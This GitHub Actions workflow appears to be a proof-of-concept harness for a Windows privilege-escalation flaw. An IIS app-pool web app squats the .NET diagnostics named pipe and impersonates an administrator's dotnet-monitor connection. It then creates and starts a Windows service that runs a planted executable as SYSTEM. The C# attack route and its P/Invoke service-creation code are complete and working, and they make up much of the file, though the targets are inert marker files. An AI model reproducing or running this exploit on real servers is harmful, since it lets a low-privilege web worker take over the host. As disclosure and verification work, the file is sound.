name: PA30 L105 monitor IIS recycle discriminator
on:
  push:
    branches: [pa30-rank01-l105-scm-20261128]
    paths:
      - .github/workflows/pa30-l105-monitor-appcmd-recycle-net10.yml
permissions:
  contents: read
jobs:
  windows:
    runs-on: windows-2025
    timeout-minutes: 20
    steps:
      - uses: actions/setup-dotnet@v4
        with:
          dotnet-version: 10.0.100
      - name: Test configured monitor across appcmd pool recycle
        shell: pwsh
        run: |
          $ErrorActionPreference = 'Stop'
          $ProgressPreference = 'SilentlyContinue'
          $root = Join-Path $env:RUNNER_TEMP 'Pa30L105Scm'
          $server = Join-Path $root 'rank21server'
          $project = Join-Path $root 'web'
          $published = Join-Path $root 'published'
          $protected = Join-Path $root 'protected'
          $sentinel = Join-Path $protected 'owner-only.txt'
          $child = Join-Path $protected 'admin-child.txt'
          $systemMarker = Join-Path $protected 'system-only.txt'
          $serviceName = 'Pa30L105ScmProof'
          $cmdExe = Join-Path $env:windir 'System32/cmd.exe'
          $probeProject = Join-Path $root 'probe-project'
          $probePublished = Join-Path $published 'probe-fixture'
          if ($child -match '\s' -or $systemMarker -match '\s') { throw 'Inert marker path unexpectedly contains spaces' }
          $attack = Join-Path $root 'attacker'
          New-Item -ItemType Directory -Force -Path $root,$server,$project,$published,$protected,$attack,$probeProject | Out-Null
          Set-Content -Path $sentinel -Value 'PA30-owned-inert-sentinel' -NoNewline
          Set-Content -Path $systemMarker -Value 'PA30-system-baseline' -NoNewline
          dotnet --info | Select-Object -First 30
          $feature = Get-WindowsOptionalFeature -Online -FeatureName IIS-URLAuthorization
          if ($feature.State -ne 'Enabled') { Enable-WindowsOptionalFeature -Online -FeatureName IIS-URLAuthorization -All -NoRestart | Out-Null }
          $installer = Join-Path $root 'dotnet-hosting-10.0.15-win.exe'
          Invoke-WebRequest 'https://builds.dotnet.microsoft.com/dotnet/aspnetcore/Runtime/10.0.15/dotnet-hosting-10.0.15-win.exe' -OutFile $installer
          $signature = Get-AuthenticodeSignature $installer
          if ($signature.Status -ne 'Valid' -or $signature.SignerCertificate.Subject -notmatch 'Microsoft') { throw 'Official Hosting Bundle signature invalid' }
          Write-Host "HOSTING_BUNDLE_SHA256=$((Get-FileHash $installer -Algorithm SHA256).Hash)"
          $install = Start-Process $installer -ArgumentList '/quiet','/norestart' -Wait -PassThru
          if ($install.ExitCode -notin @(0,3010)) { throw "Hosting Bundle exit $($install.ExitCode)" }
          net stop was /y | Out-Host
          net start w3svc | Out-Host
          $module = Join-Path $env:ProgramFiles 'IIS/Asp.Net Core Module/V2/aspnetcorev2.dll'
          if (-not (Test-Path $module)) { throw 'ANCM module missing' }
          Write-Host "ANCM_SHA256=$((Get-FileHash $module -Algorithm SHA256).Hash)"
          dotnet tool install dotnet-trace --tool-path (Join-Path $root 'tools') --version 10.0.750501
          $tool = Join-Path $root 'tools/dotnet-trace.exe'
          & $tool --version
          dotnet tool install dotnet-monitor --tool-path (Join-Path $root 'monitor-tools') --version 10.0.5
          if ($LASTEXITCODE -ne 0) { throw 'dotnet-monitor install failed' }
          $monitorTool = Join-Path $root 'monitor-tools/dotnet-monitor.exe'
          & $monitorTool --version
          if ($LASTEXITCODE -ne 0) { throw 'dotnet-monitor version failed' }
          dotnet new web -n Pa30Web -f net10.0 -o $project --no-restore | Out-Host
          @'
          using System.IO.Pipes;
          using System.Security.Principal;
          using System.Runtime.InteropServices;
          var app = WebApplication.Create();
          var root = Directory.GetParent(app.Environment.ContentRootPath)!.FullName;
          var logPath = Path.Combine(root, "attacker", "web.trace");
          var sentinelPath = Path.Combine(root, "protected", "owner-only.txt");
          var writePath = Path.Combine(root, "protected", "admin-child.txt");
          var systemMarkerPath = Path.Combine(root, "protected", "system-only.txt");
          var probeSource = Path.Combine(app.Environment.ContentRootPath, "probe-fixture");
          var probeDestination = Path.Combine(root, "attacker", "serviceprobe");
          var serviceCommand = "\"" + Path.Combine(probeDestination, "Pa30SystemProbe.exe") + "\" \"" + systemMarkerPath + "\"";
          app.MapGet("/", () => $"PID={Environment.ProcessId}");
          app.MapGet("/arm", () => {
              _ = Task.Run(() => {
                  using var log = new StreamWriter(new FileStream(logPath, FileMode.Create, FileAccess.Write, FileShare.ReadWrite)) { AutoFlush = true };
                  try {
                      log.WriteLine($"ATTACKER_SID={WindowsIdentity.GetCurrent().User?.Value}");
                      try { File.ReadAllText(sentinelPath); log.WriteLine("DIRECT_READ_DENIED=False"); }
                      catch (Exception ex) { log.WriteLine($"DIRECT_READ_DENIED={ex is UnauthorizedAccessException} TYPE={ex.GetType().Name}"); }
                      try { File.WriteAllText(writePath, "should-not-write"); log.WriteLine("DIRECT_WRITE_DENIED=False"); }
                      catch (Exception ex) { log.WriteLine($"DIRECT_WRITE_DENIED={ex is UnauthorizedAccessException} TYPE={ex.GetType().Name}"); }
                      Directory.CreateDirectory(probeDestination);
                      foreach (var file in Directory.GetFiles(probeSource)) File.Copy(file, Path.Combine(probeDestination, Path.GetFileName(file)), true);
                      log.WriteLine($"PAYLOAD_PLACED_AS_APPPOOL={File.Exists(Path.Combine(probeDestination, "Pa30SystemProbe.exe"))}");
                      var directScm = Native.OpenSCManager(null, null, Native.SC_MANAGER_CREATE_SERVICE);
                      var directScmError = directScm == IntPtr.Zero ? Marshal.GetLastWin32Error() : 0;
                      if (directScm != IntPtr.Zero) Native.CloseServiceHandle(directScm);
                      log.WriteLine($"DIRECT_SCM_DENIED={directScm == IntPtr.Zero && directScmError == 5} ERROR={directScmError}");
                      using var pipe = new NamedPipeServerStream($"dotnet-diagnostic-{Environment.ProcessId}", PipeDirection.InOut, NamedPipeServerStream.MaxAllowedServerInstances);
                      log.WriteLine($"PIPE_BOUND=True PID={Environment.ProcessId}");
                      pipe.WaitForConnection();
                      log.WriteLine($"FIRST_BYTE={pipe.ReadByte()}");
                      pipe.RunAsClient(() => {
                          log.WriteLine($"IMPERSONATED_SID={WindowsIdentity.GetCurrent().User?.Value}");
                          log.WriteLine($"IMPERSONATION_LEVEL={WindowsIdentity.GetCurrent().ImpersonationLevel}");
                          log.WriteLine($"PROTECTED_MATCH={File.ReadAllText(sentinelPath) == "PA30-owned-inert-sentinel"}");
                          File.WriteAllText(writePath, "PA30-inert-admin-write");
                          log.WriteLine("PROTECTED_WRITE=True");
                          try { File.WriteAllText(systemMarkerPath, "should-not-write"); log.WriteLine("ADMIN_DIRECT_SYSTEM_WRITE_DENIED=False"); }
                          catch (Exception ex) { log.WriteLine($"ADMIN_DIRECT_SYSTEM_WRITE_DENIED={ex is UnauthorizedAccessException} TYPE={ex.GetType().Name}"); }
                          var scm = Native.OpenSCManager(null, null, Native.SC_MANAGER_CREATE_SERVICE);
                          var scmError = scm == IntPtr.Zero ? Marshal.GetLastWin32Error() : 0;
                          log.WriteLine($"IMPERSONATED_SCM_OPEN={scm != IntPtr.Zero} ERROR={scmError}");
                          if (scm != IntPtr.Zero) {
                              try {
                                  var svc = Native.CreateService(scm, "Pa30L105ScmProof", "PA30 inert L105 SCM proof", Native.SERVICE_START | Native.DELETE,
                                      Native.SERVICE_WIN32_OWN_PROCESS, Native.SERVICE_DEMAND_START, 0, serviceCommand,
                                      null, IntPtr.Zero, null, null, null);
                                  var createError = svc == IntPtr.Zero ? Marshal.GetLastWin32Error() : 0;
                                  log.WriteLine($"IMPERSONATED_SERVICE_CREATED={svc != IntPtr.Zero} ERROR={createError}");
                                  if (svc != IntPtr.Zero) {
                                      try {
                                          var startOk = Native.StartService(svc, 0, IntPtr.Zero);
                                          var startError = startOk ? 0 : Marshal.GetLastWin32Error();
                                          log.WriteLine($"IMPERSONATED_SERVICE_START={startOk} ERROR={startError}");
                                      } finally { Native.CloseServiceHandle(svc); }
                                  }
                              } finally { Native.CloseServiceHandle(scm); }
                          }
                          log.WriteLine("SCM_EFFECT_COMPLETE=True");
                      });
                  }
                  catch (Exception ex) { log.WriteLine($"ATTACK_EXCEPTION={ex.GetType().Name} HRESULT={ex.HResult} MESSAGE={ex.Message}"); }
                  finally { log.WriteLine("ATTACK_STOPPED=True"); }
              });
              return "ARMED";
          });
          app.Run();
          internal static class Native {
              internal const int SC_MANAGER_CREATE_SERVICE = 0x0002;
              internal const int SERVICE_START = 0x0010;
              internal const int DELETE = 0x00010000;
              internal const int SERVICE_WIN32_OWN_PROCESS = 0x00000010;
              internal const int SERVICE_DEMAND_START = 0x00000003;
              [DllImport("advapi32.dll", EntryPoint="OpenSCManagerW", CharSet=CharSet.Unicode, SetLastError=true)]
              internal static extern IntPtr OpenSCManager(string? machine, string? database, int access);
              [DllImport("advapi32.dll", EntryPoint="CreateServiceW", CharSet=CharSet.Unicode, SetLastError=true)]
              internal static extern IntPtr CreateService(IntPtr scm, string name, string display, int access, int serviceType,
                  int startType, int errorControl, string binaryPath, string? loadOrderGroup, IntPtr tagId,
                  string? dependencies, string? account, string? password);
              [DllImport("advapi32.dll", EntryPoint="StartServiceW", CharSet=CharSet.Unicode, SetLastError=true)]
              [return: MarshalAs(UnmanagedType.Bool)]
              internal static extern bool StartService(IntPtr service, int argc, IntPtr argv);
              [DllImport("advapi32.dll", EntryPoint="CloseServiceHandle", SetLastError=true)]
              [return: MarshalAs(UnmanagedType.Bool)]
              internal static extern bool CloseServiceHandle(IntPtr handle);
          }
          '@ | Set-Content -Path (Join-Path $project 'Program.cs') -Encoding utf8
          dotnet publish (Join-Path $project 'Pa30Web.csproj') -c Release -o $published | Out-Host
          if ($LASTEXITCODE -ne 0) { throw 'Web app publish failed' }
          if (-not (Select-String -Path (Join-Path $published 'web.config') -Pattern 'hostingModel="inprocess"' -Quiet)) { throw 'Published app not configured for in-process IIS' }
          dotnet new console -n Pa30SystemProbe -f net10.0 -o $probeProject --no-restore | Out-Host
          @'
          using System.Security.Principal;
          var marker = args[0];
          var log = Path.Combine(AppContext.BaseDirectory, "probe.log");
          try {
              var sid = WindowsIdentity.GetCurrent().User?.Value ?? "UNKNOWN";
              File.WriteAllText(log, "STARTED_SID=" + sid);
              File.WriteAllText(marker, sid);
              File.AppendAllText(log, "\nSYSTEM_MARKER_WRITTEN=True");
          } catch (Exception ex) {
              File.AppendAllText(log, "\nPROBE_EXCEPTION=" + ex.GetType().Name + " HRESULT=" + ex.HResult + " MESSAGE=" + ex.Message);
          }
          '@ | Set-Content -Path (Join-Path $probeProject 'Program.cs') -Encoding utf8
          dotnet publish (Join-Path $probeProject 'Pa30SystemProbe.csproj') -c Release -p:UseAppHost=true -o $probePublished | Out-Host
          if ($LASTEXITCODE -ne 0 -or -not (Test-Path (Join-Path $probePublished 'Pa30SystemProbe.exe'))) { throw 'Service probe publish failed' }
          Write-Host "SERVICE_PROBE_EXE_SHA256=$((Get-FileHash (Join-Path $probePublished 'Pa30SystemProbe.exe') -Algorithm SHA256).Hash)"
          $appcmd = Join-Path $env:windir 'System32/inetsrv/appcmd.exe'
          & $appcmd add apppool /name:Pa30Pool | Out-Host
          if ($LASTEXITCODE -ne 0) { throw 'Could not add app pool' }
          & $appcmd set apppool Pa30Pool /managedRuntimeVersion:"" /startMode:AlwaysRunning | Out-Host
          if ($LASTEXITCODE -ne 0) { throw 'Could not configure app pool' }
          & $appcmd add site /name:Pa30Site /bindings:http/127.0.0.1:8911: "/physicalPath:$published" | Out-Host
          if ($LASTEXITCODE -ne 0) { throw 'Could not add site' }
          & $appcmd set app 'Pa30Site/' /applicationPool:Pa30Pool /preloadEnabled:false | Out-Host
          if ($LASTEXITCODE -ne 0) { throw 'Could not configure site app' }
          icacls $attack /grant 'IIS AppPool\Pa30Pool:(OI)(CI)M' | Out-Null
          icacls $protected /inheritance:r /grant:r "$($env:USERNAME):(OI)(CI)F" 'SYSTEM:(OI)(CI)F' 'Administrators:(OI)(CI)F' | Out-Null
          icacls $sentinel /inheritance:r /grant:r "$($env:USERNAME):R" 'SYSTEM:F' 'Administrators:F' | Out-Null
          icacls $systemMarker /inheritance:r /grant:r 'SYSTEM:F' 'Administrators:R' | Out-Null
          Write-Host "SYSTEM_MARKER_BASELINE=$(Get-Content $systemMarker -Raw)"
          $adminIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
          $adminSid = $adminIdentity.User.Value
          $isAdmin = [System.Security.Principal.WindowsPrincipal]::new($adminIdentity).IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
          Write-Host "ADMIN_SID=$adminSid ADMIN_ROLE=$isAdmin"
          if (-not $isAdmin) { throw 'Elevated administrator baseline failed' }
          $siteState = & $appcmd list site Pa30Site /text:state
          if ($siteState -ne 'Started') { & $appcmd start site Pa30Site | Out-Host }
          function Test-Listed([int]$processId) {
            $listing = & $tool ps | Out-String
            if ($LASTEXITCODE -ne 0) { throw 'dotnet-trace ps failed' }
            return [bool]($listing -match "(?m)^\s*$processId\s")
          }
          $normal = Invoke-WebRequest 'http://127.0.0.1:8911/' -UseBasicParsing -TimeoutSec 20
          $normalMatch = [regex]::Match([string]$normal.Content, '^PID=(\d+)$')
          if ($normal.StatusCode -ne 200 -or -not $normalMatch.Success) { throw 'Normal IIS request failed' }
          $normalProcessId = [int]$normalMatch.Groups[1].Value
          $normalListed = Test-Listed $normalProcessId
          Write-Host "NORMAL_WORKER_PID=$normalProcessId NORMAL_LISTED=$normalListed"
          if (-not $normalListed) { throw 'Normal diagnostics endpoint baseline failed' }
          $validTracePath = Join-Path $root 'valid.nettrace'
          $validTrace = Start-Process -FilePath $tool -ArgumentList @('collect','--process-id',$normalProcessId,'--duration','00:00:03','--output',$validTracePath) -Wait -PassThru -RedirectStandardOutput (Join-Path $root 'valid.out') -RedirectStandardError (Join-Path $root 'valid.err')
          $validBytes = if (Test-Path $validTracePath) { (Get-Item $validTracePath).Length } else { 0 }
          Write-Host "VALID_TRACE_EXIT=$($validTrace.ExitCode) VALID_TRACE_BYTES=$validBytes"
          if ($validTrace.ExitCode -ne 0 -or $validBytes -le 0) { throw 'Genuine IIS diagnostics attach failed' }
          $env:DotnetMonitor_DefaultProcess__Filters__0__ProcessName = 'w3wp'
          $baselineMonitor = Start-Process -FilePath $monitorTool -ArgumentList @('collect','--urls','http://127.0.0.1:52401','--metricUrls','http://127.0.0.1:52402','--temp-apikey') -PassThru -RedirectStandardOutput (Join-Path $root 'monitor-baseline.out') -RedirectStandardError (Join-Path $root 'monitor-baseline.err')
          $validMetrics = $false
          for ($i=0; $i -lt 40; $i++) {
            Start-Sleep -Milliseconds 500
            if ($baselineMonitor.HasExited) { break }
            try { $response = Invoke-WebRequest 'http://127.0.0.1:52402/metrics' -UseBasicParsing -TimeoutSec 2; if ($response.StatusCode -eq 200 -and $response.Content -match 'systemruntime') { $validMetrics = $true; break } } catch {}
          }
          Write-Host "VALID_MONITOR_METRICS=$validMetrics BASELINE_MONITOR_ALIVE=$(-not $baselineMonitor.HasExited)"
          if (-not $validMetrics -or $baselineMonitor.HasExited) { throw 'Genuine monitor metrics baseline failed' }
          $recycleMonitor = $baselineMonitor
          Write-Host "RECYCLE_MONITOR_ALIVE_BEFORE_APPCMD=$(-not $recycleMonitor.HasExited)"
          & $appcmd recycle apppool /apppool.name:Pa30Pool | Out-Host
          if ($LASTEXITCODE -ne 0) { throw 'Could not recycle normal app pool' }
          $idleWorker = $null
          for ($i=0; $i -lt 60; $i++) {
            $workers = @(Get-CimInstance Win32_Process -Filter "Name='w3wp.exe'" | Where-Object { $_.CommandLine -like '*Pa30Pool*' -and [int]$_.ProcessId -ne $normalProcessId })
            if ($workers.Count -eq 1) { $idleWorker = $workers[0]; break }
            Start-Sleep -Milliseconds 500
          }
          if ($null -eq $idleWorker) { throw "No distinct w3wp worker after appcmd recycle; found=$($workers.Count)" }
          Write-Host "OLD_WORKER_ALIVE_AFTER_RECYCLE=$([bool](Get-Process -Id $normalProcessId -ErrorAction SilentlyContinue)) RECYCLE_MONITOR_ALIVE_AFTER_APPCMD=$(-not $recycleMonitor.HasExited)"
          $idleProcessId = [int]$idleWorker.ProcessId
          $modules = @(Get-Process -Id $idleProcessId -Module | ForEach-Object ModuleName)
          $coreclrBefore = $modules -contains 'coreclr.dll'
          $idleListed = Test-Listed $idleProcessId
          Write-Host "IDLE_WORKER_PID=$idleProcessId CORECLR_BEFORE=$coreclrBefore IDLE_LISTED=$idleListed"
          Write-Host "::notice title=PA30 IIS idle state::PID=$idleProcessId CORECLR_BEFORE=$coreclrBefore IDLE_LISTED=$idleListed"
          if ($coreclrBefore -or $idleListed) { throw 'IIS worker loaded CLR or diagnostics before first request' }
          $noFake = Start-Process -FilePath $tool -ArgumentList @('collect','--process-id',$idleProcessId,'--duration','00:00:03','--output',(Join-Path $root 'no-fake.nettrace')) -PassThru -RedirectStandardOutput (Join-Path $root 'no-fake.out') -RedirectStandardError (Join-Path $root 'no-fake.err')
          $noFakeCompleted = $noFake.WaitForExit(8000)
          if (-not $noFakeCompleted) { Stop-Process -Id $noFake.Id -Force; if (-not $noFake.WaitForExit(5000)) { throw 'No-fake control failed to stop' } }
          Write-Host "NO_FAKE_NEW_PID_COMPLETED=$noFakeCompleted NO_FAKE_NAME_EXIT=$(if ($noFakeCompleted) { $noFake.ExitCode } else { 'bounded-wait' })"
          if ($noFakeCompleted -and $noFake.ExitCode -eq 0) { throw 'No-fake name attach unexpectedly succeeded' }
          $ready = Invoke-WebRequest 'http://127.0.0.1:8911/' -UseBasicParsing -TimeoutSec 30
          $runtimeReady = $ready.StatusCode -eq 200 -and $ready.Content -eq "PID=$idleProcessId" -and (Test-Listed $idleProcessId)
          $workerCim = Get-CimInstance Win32_Process -Filter "ProcessId=$idleProcessId"
          $workerOwner = Invoke-CimMethod -InputObject $workerCim -MethodName GetOwner
          $sameIdentity = $workerOwner.Domain -eq 'IIS APPPOOL' -and $workerOwner.User -eq 'Pa30Pool'
          Write-Host "RUNTIME_READY_BEFORE_SERVICE=$runtimeReady WORKER_OWNER=$($workerOwner.Domain)\$($workerOwner.User) SAME_IDENTITY=$sameIdentity"
          if (-not $runtimeReady -or -not $sameIdentity) { throw 'Genuine default app-pool endpoint not ready before attack route' }
          $armed = Invoke-WebRequest 'http://127.0.0.1:8911/arm' -UseBasicParsing -TimeoutSec 20
          if ($armed.StatusCode -ne 200 -or $armed.Content -ne 'ARMED') { throw 'Attacker route did not arm' }
          $attackTrace = Join-Path $attack 'web.trace'
          $initialTrace = ''
          for ($i=0; $i -lt 150; $i++) {
            if (Test-Path $attackTrace) {
              $initialTrace = Get-Content $attackTrace -Raw
              if ($initialTrace -match 'PIPE_BOUND=True' -or $initialTrace -match 'ATTACK_EXCEPTION=') { break }
            }
            Start-Sleep -Milliseconds 100
          }
          Write-Host "ATTACK_TRACE=$($initialTrace.Replace("`r"," ").Replace("`n"," | "))"
          $attackerSidMatch = [regex]::Match($initialTrace, 'ATTACKER_SID=(S-1-5-82-[0-9-]+)')
          $bound = $initialTrace -match 'PIPE_BOUND=True' -and $initialTrace -match "PID=$idleProcessId"
          $directDenied = $initialTrace -match 'DIRECT_READ_DENIED=True' -and $initialTrace -match 'DIRECT_WRITE_DENIED=True'
          Write-Host "APPPOOL_SID=$($attackerSidMatch.Groups[1].Value) APPPOOL_BOUND=$bound DIRECT_DENIED=$directDenied"
          if (-not $attackerSidMatch.Success -or -not $bound -or -not $directDenied) { throw 'Default app-pool attacker did not bind or direct denial failed' }
          # Preserve the original configured monitor across old worker death,
          # new worker creation and the lower app-pool's extra-pipe bind.
          for ($i=0; $i -lt 60; $i++) {
            Start-Sleep -Milliseconds 500
            if ($recycleMonitor.HasExited) { break }
            if ((Get-Content $attackTrace -Raw) -match 'SCM_EFFECT_COMPLETE=True') { break }
          }
          $recycleMonitorAlive = -not $recycleMonitor.HasExited
          $recycleTrace = Get-Content $attackTrace -Raw
          $recycleReceived = $recycleTrace -match 'FIRST_BYTE=' -or $recycleTrace -match 'SCM_EFFECT_COMPLETE=True'
          Write-Host "RECYCLE_MONITOR_ALIVE_AFTER_NEW_BIND=$recycleMonitorAlive RECYCLE_MONITOR_FAKE_RECEIVED=$recycleReceived"
          if ($recycleMonitorAlive) { Stop-Process -Id $recycleMonitor.Id -Force }
          $fakeReceived = $recycleReceived
          $freshReceived = $false
          if (-not $recycleReceived) {
            # Same new worker and pipe; only the configured monitor connection is fresh.
            $freshMonitor = Start-Process -FilePath $monitorTool -ArgumentList @('collect','--urls','http://127.0.0.1:52409','--metricUrls','http://127.0.0.1:52410','--temp-apikey') -PassThru -RedirectStandardOutput (Join-Path $root 'monitor-fresh.out') -RedirectStandardError (Join-Path $root 'monitor-fresh.err')
            for ($i=0; $i -lt 90; $i++) {
              Start-Sleep -Milliseconds 500
              if ((Get-Content $attackTrace -Raw) -match 'SCM_EFFECT_COMPLETE=True') { $freshReceived = $true; break }
              if ($freshMonitor.HasExited) { break }
            }
            Write-Host "FRESH_MONITOR_ALIVE=$(-not $freshMonitor.HasExited) FRESH_MONITOR_FAKE_RECEIVED=$freshReceived"
            if (-not $freshMonitor.HasExited) { Stop-Process -Id $freshMonitor.Id -Force }
            $fakeReceived = $freshReceived
          }
          Remove-Item Env:DotnetMonitor_DefaultProcess__Filters__0__ProcessName
          $finalTrace = Get-Content $attackTrace -Raw
          for ($i=0; $i -lt 120 -and $finalTrace -notmatch 'SCM_EFFECT_COMPLETE=True' -and $finalTrace -notmatch 'ATTACK_EXCEPTION='; $i++) {
            Start-Sleep -Milliseconds 500
            $finalTrace = Get-Content $attackTrace -Raw
          }
          Write-Host "FINAL_ATTACK_TRACE=$($finalTrace.Replace("`r"," ").Replace("`n"," | "))"
          $firstByteOk = $finalTrace -match 'FIRST_BYTE=68'
          $impersonatedSidOk = $finalTrace -match ([regex]::Escape("IMPERSONATED_SID=$adminSid"))
          $levelOk = $finalTrace -match 'IMPERSONATION_LEVEL=Impersonation'
          $protectedMatch = $finalTrace -match 'PROTECTED_MATCH=True'
          $writeObserved = $finalTrace -match 'PROTECTED_WRITE=True'
          $writeContent = if (Test-Path $child) { Get-Content $child -Raw } else { '' }
          $writeMatch = $writeContent -eq 'PA30-inert-admin-write'
          $directScmDenied = $finalTrace -match 'DIRECT_SCM_DENIED=True'
          $adminSystemDenied = $finalTrace -match 'ADMIN_DIRECT_SYSTEM_WRITE_DENIED=True'
          $scmOpened = $finalTrace -match 'IMPERSONATED_SCM_OPEN=True'
          $serviceCreated = $finalTrace -match 'IMPERSONATED_SERVICE_CREATED=True'
          $serviceStartAttempted = $finalTrace -match 'IMPERSONATED_SERVICE_START='
          $systemContent = if (Test-Path $systemMarker) { Get-Content $systemMarker -Raw } else { '' }
          $systemSidWritten = [bool]($systemContent -match 'S-1-5-18')
          $probeLogPath = Join-Path $attack 'serviceprobe/probe.log'
          $probeLog = if (Test-Path $probeLogPath) { Get-Content $probeLogPath -Raw } else { '' }
          $probeSidSystem = [bool]($probeLog -match 'STARTED_SID=S-1-5-18')
          $payloadPlaced = $finalTrace -match 'PAYLOAD_PLACED_AS_APPPOOL=True'
          Write-Host "SERVICE_PROBE_LOG=$($probeLog.Replace("`r"," ").Replace("`n"," | "))"
          Write-Host "SERVICE_PROBE_PLACED_BY_APPPOOL=$payloadPlaced SERVICE_PROBE_SYSTEM_SID=$probeSidSystem MARKER_BYTES=$(if (Test-Path $systemMarker) { (Get-Item $systemMarker).Length } else { -1 })"
          sc.exe qc $serviceName | Out-Host
          Get-CimInstance Win32_Service -Filter "Name='$serviceName'" | Select-Object Name,StartName,PathName,State,ProcessId | Format-List | Out-Host
          sc.exe delete $serviceName | Out-Host
          Write-Host "DIRECT_SCM_DENIED=$directScmDenied ADMIN_DIRECT_SYSTEM_WRITE_DENIED=$adminSystemDenied IMPERSONATED_SCM_OPEN=$scmOpened IMPERSONATED_SERVICE_CREATED=$serviceCreated SERVICE_START_ATTEMPTED=$serviceStartAttempted SYSTEM_SID_WRITTEN=$systemSidWritten"
          $aliveAfter = [bool](Get-Process -Id $idleProcessId -ErrorAction SilentlyContinue)
          $listedAfter = Test-Listed $idleProcessId
          Write-Host "FAKE_INSTANCE_RECEIVED_CLIENT=$fakeReceived FIRST_BYTE_OK=$firstByteOk IMPERSONATED_ADMIN_SID=$impersonatedSidOk IMPERSONATION_LEVEL_OK=$levelOk PROTECTED_MATCH=$protectedMatch PROTECTED_WRITE=$writeObserved PROTECTED_WRITE_MATCH=$writeMatch WORKER_ALIVE_AFTER=$aliveAfter GENUINE_LISTED_AFTER=$listedAfter"
          if (-not $fakeReceived -or -not $firstByteOk -or -not $impersonatedSidOk -or -not $levelOk -or -not $protectedMatch -or -not $writeObserved -or -not $writeMatch -or -not $aliveAfter -or -not $listedAfter) { throw 'Default IIS app-pool post-runtime privileged effect failed' }
          Write-Host 'PA30_NET10_MONITOR_APPCMD_RECYCLE_ADMIN_WRITE_ALL_ASSERTIONS_PASSED=True'
          if (-not $directScmDenied -or -not $adminSystemDenied -or -not $payloadPlaced -or -not $scmOpened -or -not $serviceCreated -or -not $serviceStartAttempted -or -not $probeSidSystem -or -not $systemSidWritten) { throw 'SCM service SYSTEM terminal not proved' }
          Write-Host 'PA30_L105_MONITOR_APPCMD_RECYCLE_SYSTEM_PROTECTED_ACTION_PASSED=True'
